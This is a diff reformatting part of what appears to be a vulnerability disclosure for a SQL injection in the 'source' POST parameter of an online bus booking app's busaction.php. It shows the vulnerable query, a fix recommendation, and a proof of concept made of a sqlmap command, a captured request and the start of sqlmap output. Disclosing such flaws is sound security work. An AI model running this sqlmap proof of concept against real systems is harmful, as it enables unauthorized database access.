@@ -214,8 +214,10 @@ $sql_price="SELECT * FROM `pricebus` WHERE `source` LIKE '$source' AND `dest` LI
 Parameterized queries or precompiled statements should be used to ensure that user input is processed and escaped correctly. This can prevent attackers from tampering with query logic by injecting malicious code.
 
 POC:
-sqlmap -r r.txt 
-r.txt:
+
+`sqlmap -r r.txt `
+
+r.txt
 ```
 POST /busaction.php HTTP/1.1
 Host: onlinebus
@@ -236,6 +238,7 @@ source=Dadoji+Kondadev+Stadium&dest=Court+Naka&number=2&login_submit=
 ```
 
 ![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/0388324f-8ebb-4700-b81d-70f5ada460bf)
+
 
 ```
 Parameter: source (POST)
